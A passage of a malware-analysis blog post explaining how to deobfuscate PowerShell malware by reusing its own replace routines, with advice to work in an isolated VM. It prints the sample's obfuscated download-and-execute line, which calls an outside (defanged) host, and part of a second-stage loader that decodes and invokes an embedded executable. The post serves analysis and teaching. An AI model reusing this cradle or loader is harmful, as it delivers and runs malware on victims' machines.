<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Smarter, Not Harder: Getting Malware to Help You Analyze It" /><meta property="og:locale" content="en" /><meta name="description" content="When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using various packers/crypters or script obfuscation tools. If you know how to manipulate the malware code, however, you can use the deobfuscation capabilities of malware to reveal unpacked samples." /><meta property="og:description" content="When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using various packers/crypters or script obfuscation tools. If you know how to manipulate the malware code, however, you can use the deobfuscation capabilities of malware to reveal unpacked samples." /><link rel="canonical" href="https://forensicitguy.github.io/smarter-not-harder-malware-analysis/" /><meta property="og:url" content="https://forensicitguy.github.io/smarter-not-harder-malware-analysis/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-05T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Smarter, Not Harder: Getting Malware to Help You Analyze It" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2021-09-05T00:00:00+00:00","description":"When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using various packers/crypters or script obfuscation tools. If you know how to manipulate the malware code, however, you can use the deobfuscation capabilities of malware to reveal unpacked samples.","headline":"Smarter, Not Harder: Getting Malware to Help You Analyze It","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/smarter-not-harder-malware-analysis/"},"url":"https://forensicitguy.github.io/smarter-not-harder-malware-analysis/"}</script><title>Smarter, Not Harder: Getting Malware to Help You Analyze It | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Smarter, Not Harder: Getting Malware to Help You Analyze It</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Smarter, Not Harder: Getting Malware to Help You Analyze It</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1630800000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-09-05 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1113 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p>When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using various packers/crypters or script obfuscation tools. If you know how to manipulate the malware code, however, you can use the deobfuscation capabilities of malware to reveal unpacked samples.</p><h2 id="newtons-third-law-of-malware"><span class="mr-2">Newton’s Third Law (of Malware)</span><a href="#newtons-third-law-of-malware" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>If you’ve studied Physics you’ve likely run across Newton’s Third Law of Motion: “For every action, there is an equal and opposite reaction.” The same law can be applied to obfuscated malware. When at rest or during transmission, adversaries may encrypt or encode malicious code to avoid static signatures. During execution, though, the encoding or encryption must be removed so the code can successfully load and execute.</p><p>To facilitate this process, adversaries commonly include algorithms within obfuscated code designed to remove the obfuscation at runtime. If you can focus on how the algorithm is called and used, you can use it for your own purposes!</p><h2 id="safety-first"><span class="mr-2">Safety First!</span><a href="#safety-first" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This exercise in deobfuscation requires us to execute portions of code from malware. We’re not performing dynamic analysis, but there is the possibility that we might accidentally execute some malicious code. To protect against this possibility, use a virtual machine for analysis. Prior to analysis, remove any network connections and shared folders before taking a snapshot and beginning to work.</p><p>During analysis we want to identify any code designed to interpret, invoke, or execute commands so we can comment them out. We only want to execute commands designed to manipulate data and write data to files.</p><h2 id="a-simple-example-to-start"><span class="mr-2">A Simple Example to Start</span><a href="#a-simple-example-to-start" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>An excellent example of using the malware code against itself can be found with this sample: <a href="https://www.virustotal.com/gui/file/578f5dba1af809ee5b492582c38c5cf6e8bd1319fe91cc2cb0fb6066ca3c1eb9/">https://www.virustotal.com/gui/file/578f5dba1af809ee5b492582c38c5cf6e8bd1319fe91cc2cb0fb6066ca3c1eb9/</a>. This sample leads to the execution of a second sample that is more complex which we can also work with.</p><p>The original code for this sample appears similar to this:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Net'</span><span class="o">+</span><span class="s1">'.@@@@@@@@@@@@@$$$$$$$$$$$$$$$$$&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;t'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@@@@@@@@@@@@@$$$$$$$$$$$$$$$$$&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'</span><span class="p">,</span><span class="s1">''</span><span class="o">+</span><span class="s1">'Webc'</span><span class="o">+</span><span class="s1">'lien'</span><span class="p">)</span><span class="w">

</span><span class="nv">$2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;~~~~~~~~~~~~~~~~~~okE'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;~~~~~~~~~~~~~~~~~~'</span><span class="p">,</span><span class="s1">'InV'</span><span class="p">)</span><span class="w">
</span><span class="nv">$3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'D'</span><span class="o">+</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'w'</span><span class="o">+</span><span class="s1">'n'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">+</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'d'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">+</span><span class="s1">'tri'</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">''</span><span class="o">+</span><span class="s1">'n'</span><span class="o">+</span><span class="s1">'g'</span><span class="w">

</span><span class="n">I</span><span class="se">`E</span><span class="nx">X</span><span class="p">((</span><span class="n">n</span><span class="se">`e`W`-</span><span class="nx">Obj</span><span class="se">`E`c`T</span><span class="w"> </span><span class="p">((</span><span class="nv">$1</span><span class="p">)))</span><span class="o">.</span><span class="p">((</span><span class="nv">$3</span><span class="p">))</span><span class="o">.</span><span class="nv">$2</span><span class="p">(((</span><span class="s1">'hxxps://raw.githubusercontent[.]com/az3r12/NYAN/main/Server.jpg'</span><span class="p">))))</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'ooooiiiiiiiiiijhgfghjiugghjllknfderrthbbvccdssgvhhgoooooo'</span><span class="p">,</span><span class="s1">'ForEach-Object {( [Convert]::ToInt16(([String]$_), 8) -As[Char])});sal g $t0'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'rxectfyvhgbuyhnikjmmnubyvbgvfcttyghuytvcxetcryvtubyjnhbgvfcdrctvuybvcrxrtyuubvtrcex'</span><span class="p">,</span><span class="s1">'[Parameter(Mandatory=$true)] [String]$HLH'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'trdyjtuybiuyminubyvtcrytvybunibuyvtcrxtcytvuybiubihugyftuyiuo'</span><span class="p">,</span><span class="s1">'New-Object -TypeName byte[] -ArgumentList ($HLH.Length / 2)'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'fyyfbyfyfjyfjvyhtftdvbytdvtftfbfbytf'</span><span class="p">,</span><span class="s1">'[Convert]::ToByte($HLH.Substring($i, 2), 16)'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'trcymtuvybiuyvtcrtcytuyiubyvtcw4gh5djf6g7nbfvdrcsxetcrdytfbygyvcdr'</span><span class="p">,</span><span class="s1">'{'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'yuuuuuuuuuuuuuuuuvgggggggggggxddddddddddzswvttttttttt'</span><span class="p">,</span><span class="s1">'('</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'mbappebgfvnjjhffgjjufghiolmgfd mbappe'</span><span class="p">,</span><span class="s1">')'</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>In this example, the first three variables contain substrings of <code class="language-plaintext highlighter-rouge">Net.Webclient.DownloadString</code> obfuscated using string replacement and a string broken up into individual characters. This indicates PowerShell will download something from a URL. Later in the code there is a URL, so we can reasonably assume the code will download something from it. At the beginning of the final line, an <code class="language-plaintext highlighter-rouge">IEX</code> statement is slightly obfuscated using a single character. <code class="language-plaintext highlighter-rouge">IEX</code> is shorthand for <code class="language-plaintext highlighter-rouge">Invoke-Expression</code> in PowerShell, and we can assume it will execute any code downloaded from the URL.</p><p>After the <code class="language-plaintext highlighter-rouge">IEX</code> there are loads of <code class="language-plaintext highlighter-rouge">.Replace()</code> function calls. This is where the adversary manipulates data in their next stage of the chain. Presumably whatever gets executed will have junk code inside, but the junk code is replaced by real, useful code before execution. Once we retrieve the next stage into a text file, we can deobfuscate it using this code:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$obfuscated_script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="o">.</span><span class="nx">/Server.jpg</span><span class="w">

</span><span class="nv">$deobfuscated_script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$obfuscated_script</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'ooooiiiiiiiiiijhgfghjiugghjllknfderrthbbvccdssgvhhgoooooo'</span><span class="p">,</span><span class="s1">'ForEach-Object {( [Convert]::ToInt16(([String]$_), 8) -As[Char])});sal g $t0'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'rxectfyvhgbuyhnikjmmnubyvbgvfcttyghuytvcxetcryvtubyjnhbgvfcdrctvuybvcrxrtyuubvtrcex'</span><span class="p">,</span><span class="s1">'[Parameter(Mandatory=$true)] [String]$HLH'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'trdyjtuybiuyminubyvtcrytvybunibuyvtcrxtcytvuybiubihugyftuyiuo'</span><span class="p">,</span><span class="s1">'New-Object -TypeName byte[] -ArgumentList ($HLH.Length / 2)'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'fyyfbyfyfjyfjvyhtftdvbytdvtftfbfbytf'</span><span class="p">,</span><span class="s1">'[Convert]::ToByte($HLH.Substring($i, 2), 16)'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'trcymtuvybiuyvtcrtcytuyiubyvtcw4gh5djf6g7nbfvdrcsxetcrdytfbygyvcdr'</span><span class="p">,</span><span class="s1">'{'</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'yuuuuuuuuuuuuuuuuvgggggggggggxddddddddddzswvttttttttt'</span><span class="p">,</span><span class="s1">'('</span><span class="p">)</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'mbappebgfvnjjhffgjjufghiolmgfd mbappe'</span><span class="p">,</span><span class="s1">')'</span><span class="p">)</span><span class="w">

</span><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">/deobfuscated_Server.jpg.ps1</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$deobfuscated_script</span><span class="w">
</span></pre></table></code></div></div><p>In this particular case we reused the <code class="language-plaintext highlighter-rouge">.Replace()</code> function calls to make all the deobfuscation happen automatically rather than doing a manual find and replace operation for each one. This sort of efficiency can add up to a lot of saved time during analysis.</p><h2 id="getting-more-complex"><span class="mr-2">Getting More Complex</span><a href="#getting-more-complex" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The next stage in the chain looks something like this (except with much more hex content):</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="nv">$b1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"111"</span><span class="w">
</span><span class="nv">$b2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"105"</span><span class="w">
</span><span class="nv">$b3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"130"</span><span class="w">
</span><span class="nv">$b4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"[String]"</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$t0</span><span class="o">=-Join</span><span class="w"> </span><span class="p">((</span><span class="nv">$b1</span><span class="p">,</span><span class="w"> </span><span class="nv">$b2</span><span class="p">,</span><span class="w"> </span><span class="nv">$b3</span><span class="w">  </span><span class="p">)</span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{(</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToInt16</span><span class="p">(([</span><span class="n">String</span><span class="p">]</span><span class="bp">$_</span><span class="p">),</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">-As</span><span class="p">[</span><span class="n">Char</span><span class="p">])});</span><span class="n">sal</span><span class="w"> </span><span class="nx">g</span><span class="w"> </span><span class="nv">$t0</span><span class="w">

</span><span class="nv">$b4</span><span class="o">=</span><span class="nv">$TC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"4D5A9\/\/\/\/3..."</span><span class="o">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'\/'</span><span class="p">,</span><span class="s1">'0'</span><span class="w"> </span><span class="p">)</span><span class="w">

</span><span class="kr">Function</span><span class="w"> </span><span class="nf">HBankers</span><span class="w"> </span><span class="p">{</span><span class="w">
 
    </span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">(</span><span class="w"> </span><span class="p">)]</span><span class="w">
    </span><span class="p">[</span><span class="n">OutputType</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">)]</span><span class="w">
    </span><span class="kr">param</span><span class="p">(</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="o">=</span><span class="bp">$true</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$HLH</span><span class="w"> 
     </span><span class="p">)</span><span class="w">
    </span><span class="nv">$HHPPLL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">byte</span><span class="p">[]</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="p">(</span><span class="nv">$HLH</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">2</span><span class="p">)</span><span class="w">
    </span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$HLH</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$HHPPLL</span><span class="p">[</span><span class="nv">$i</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToByte</span><span class="p">(</span><span class="nv">$HLH</span><span class="o">.</span><span class="nf">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="w"> </span><span class="nx">2</span><span class="p">),</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="n">return</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$HHPPLL</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$HL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'4D5A9\/\/\/\/3...'</span><span class="o">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'\/'</span><span class="p">,</span><span class="s1">'0'</span><span class="w"> </span><span class="p">)</span><span class="w">
  
</span><span class="nv">$A1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Ge&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;..............&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;od"</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;..............&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'</span><span class="p">,</span><span class="s1">'tMeth'</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="nv">$A2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"g!!!!!!!!!!!!!@@@@@@@@@@@@@@@@################in"</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!!!!!!!!!!!!!@@@@@@@@@@@@@@@@################'</span><span class="p">,</span><span class="s1">'et_CurrentDoma'</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="nv">$A3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"I@@@@@@@@@@@@@@@&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;..!!!!!!!!!!!!!!!!!!!!!!e"</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'@@@@@@@@@@@@@@@&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;..!!!!!!!!!!!!!!!!!!!!!!'</span><span class="p">,</span><span class="s1">'nvok'</span><span class="w"> </span><span class="p">)</span><span class="w">
